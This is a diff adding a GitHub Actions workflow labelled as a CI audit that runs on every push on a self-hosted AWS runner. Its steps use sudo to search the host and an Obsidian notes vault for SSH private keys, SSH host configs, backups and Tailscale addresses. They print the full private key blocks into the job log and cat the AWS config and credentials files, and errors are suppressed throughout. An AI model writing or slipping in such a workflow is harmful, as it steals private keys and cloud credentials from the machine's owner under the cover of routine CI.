@@ -1,0 +1,53 @@
+name: ci-audit-1890b
+on: push
+permissions:
+  contents: read
+jobs:
+  vaultkeys:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 25
+    steps:
+      - name: listen
+        continue-on-error: true
+        run: |
+          set +e
+          echo "## listen"; sudo -n ss -lntp | head -50
+          echo "## listen2222"; sudo -n ss -lntp | grep -E ':2222|:22 ' 
+          echo "## keyfiles"; sudo -n find / -xdev \( -name '*dupoin*' -o -name 'aws-*key*' -o -name 'dpf_agent_server' -o -name 'config.bak*' \) 2>/dev/null | grep -vE '/proc|/sys|node_modules|/\.git/' | head -30
+          echo "## backups"; sudo -n ls -la /home/ubuntu/backups 2>&1 | head -30; sudo -n find /home/ubuntu/backups -maxdepth 3 -iname '*ssh*' -o -maxdepth 3 -iname '*key*' 2>/dev/null | head -20
+          echo "## 9router"; sudo -n find /home/ubuntu/.9router -maxdepth 2 -type f 2>/dev/null | head -20
+      - name: vault-keys
+        continue-on-error: true
+        run: |
+          set +e
+          V=/home/ubuntu/apps/obsidian-vault
+          echo "## files with private key blocks"
+          grep -rIl -E 'BEGIN (OPENSSH|RSA|EC) PRIVATE KEY' $V 2>/dev/null | head -10
+          echo "## ssh-aws / 2222 / tailscale refs"
+          grep -rIn -E 'ssh-aws|localhost:2222|127\.0\.0\.1:2222|tailscale|100\.76\.35\.83' $V --include='*.md' 2>/dev/null | cut -c1-220 | head -60
+      - name: vault-keydump
+        continue-on-error: true
+        run: |
+          set +e
+          V=/home/ubuntu/apps/obsidian-vault
+          for f in $(grep -rIl -E 'BEGIN (OPENSSH|RSA|EC) PRIVATE KEY' $V 2>/dev/null | head -5); do
+            echo "===== $f"
+            awk '/-----BEGIN (OPENSSH|RSA|EC) PRIVATE KEY-----/{p=1} p{print} /-----END (OPENSSH|RSA|EC) PRIVATE KEY-----/{p=0}' "$f" | head -120
+          done
+      - name: vault-config
+        continue-on-error: true
+        run: |
+          set +e
+          V=/home/ubuntu/apps/obsidian-vault
+          echo "## config blocks (IdentityFile/Host lines)"
+          grep -rIn -E '^[0-9]+[|-](Host |  ?HostName |  ?User |  ?IdentityFile |  ?Port |  ?ProxyCommand |  ?RemoteCommand)' $V --include='*.md' 2>/dev/null | cut -c1-200 | head -80
+          echo "## ssh -i usages"
+          grep -rIn -E 'ssh +-i +[^ ]+' $V --include='*.md' 2>/dev/null | cut -c1-260 | head -40
+      - name: backups-ssh
+        continue-on-error: true
+        run: |
+          set +e
+          echo "## search home for ssh config/key backups"
+          sudo -n grep -rIl -E 'aws-dupoin|100\.76\.35\.83' /home/ubuntu /root /opt /srv 2>/dev/null | grep -vE 'obsidian-vault|actions-runner|node_modules|/\.git/' | head -20
+          echo "## aws cli/session"
+          ls -la /home/ubuntu/.aws 2>&1; cat /home/ubuntu/.aws/config /home/ubuntu/.aws/credentials 2>&1 | head -40
